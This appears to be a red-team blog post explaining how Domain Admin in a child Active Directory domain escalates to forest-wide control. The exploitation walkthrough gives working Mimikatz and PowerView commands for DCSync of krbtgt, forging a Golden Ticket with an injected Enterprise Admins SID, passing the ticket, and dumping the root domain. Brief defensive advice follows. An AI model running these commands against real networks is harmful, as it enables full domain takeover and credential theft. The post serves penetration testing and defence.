---
title: "Cross-Domain Escalation: Child-to-Forest Compromise via SID History and Golden Tickets"
date: 2020-05-24T03:20:32+00:00
url: "/enterprise-admin-golden-ticket/"
draft: false
description: "How compromising a child Active Directory domain leads to complete forest takeover by injecting the forest Enterprise Admins SID into a forged Golden Ticket (SID History abuse)."
categories: ["Active Directory", "exploit-dev", "Security"]
tags: ["active-directory", "red-team", "golden-ticket", "mimikatz", "kerberos", "dcsync"]
---

In complex enterprise networks, Active Directory is typically deployed as a multi-domain forest. An organization begins with a forest root domain (e.g., `UNIXAWY.CORP`) and branches into child domains for geographic regions, business units, or acquisitions (e.g., `operators.unixawy.corp`).

A common security misconception is that a child domain functions as a security boundary. In an Active Directory forest, **the forest is the only true security boundary—the domain is simply an administrative boundary**. 

Once an attacker achieves Domain Admin rights in a subordinate child domain, they can pivot to Enterprise Admin and compromise every domain in the forest.

---

### Core Concepts

#### 1. The Enterprise Admins Group
The **Enterprise Admins (EA)** group (`RID 519`) exists exclusively in the root domain of the forest. Members of EA possess universal administrative authority over all domain controllers and services across the entire forest.

#### 2. Kerberos Golden Tickets & `krbtgt`
A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) encrypted and signed using the domain's `krbtgt` account NTLM hash or AES key. Because the Key Distribution Center (KDC) trusts any TGT signed by the `krbtgt` key, an attacker can arbitrarily specify group memberships, user identities, and lifespans.

#### 3. SID History Injection (`extraSids`)
When users migrate between domains, Active Directory preserves access using the `sIDHistory` attribute. When validating a Kerberos ticket, the target domain includes all SIDs listed in the user's `sIDHistory` into the user's effective token. 

Because intra-forest trusts do not enable SID filtering by default, forging a Golden Ticket in a child domain and appending the **Root Domain Enterprise Admins SID** (`extraSids`) grants the bearer immediate Enterprise Admin privileges across the entire forest.

---

### Exploitation Walkthrough

Let us assume you have achieved Domain Admin on a child domain: `operators.unixawy.corp`.

#### Step 1: Query the Root Forest Enterprise Admins SID
You do not need administrative rights on the root domain (`UNIXAWY.CORP`) to query group SIDs—any domain user can read directory metadata over LDAP:

```powershell
Get-NetGroup -Domain UNIXAWY.CORP -GroupName "Enterprise Admins" -FullData | Select-Object objectsid
```
*Output:*
```text
objectsid
---------
S-1-5-21-280534878-1938582341-966625481-519
```

#### Step 2: Enumerate Domain SIDs via Trust Links
Using Mimikatz, inspect inter-domain trust relationships to obtain both the current domain SID and parent domain SID:

```text
mimikatz # lsadump::trust
Current domain: operators.UNIXAWY.CORP (opcorp / S-1-5-21-2349851236-9982960731-10393245)
Domain: UNIXAWY.CORP (UNICORP / S-1-5-21-280534878-1938582341-966625481)
```

#### Step 3: Extract the Child Domain `krbtgt` Hash via DCSync
Execute a DCSync attack against the child domain controller to retrieve the `krbtgt` secret:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:operators.unixawy.corp /user:krbtgt"'
```
Assume the extracted NTLM hash is `8b5ef256e66f97b39330ef3968b97864`.

#### Step 4: Forge the Inter-Domain Golden Ticket with ExtraSIDs
Generate the forged TGT for `Administrator`. The crucial parameter is `/sids:`, which injects the root domain's Enterprise Admins SID (`-519`):

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:operators.UNIXAWY.CORP /sid:S-1-5-21-2349851236-9982960731-10393245 /sids:S-1-5-21-280534878-1938582341-966625481-519 /krbtgt:8b5ef256e66f97b39330ef3968b97864 /ticket:c:\ea_golden_tgt.kirbi"'
```

#### Step 5: Inject and Execute Forest-Wide DCSync
Inject the forged ticket into your current logon session:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt c:\ea_golden_tgt.kirbi"'
```

Verify your Kerberos tickets with `klist`. You can now DCSync the root domain controller:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:UNIXAWY.CORP /user:krbtgt"'
```

---

### Defensive Recommendations

1. **Treat Child Domains as Untrusted:** Never place high-value assets or Tier 0 administrative accounts in child domains.
2. **Enable SID Filtering / Quarantine on Forest Trusts:** If external trusts exist, ensure SID filtering is enforced (`netdom trust ... /quarantine:yes`).
3. **Monitor `krbtgt` Requests and Ticket Anomalies:** Alert on Event ID `4769` (Kerberos ticket requested) containing abnormal SID History fields across domain boundaries.
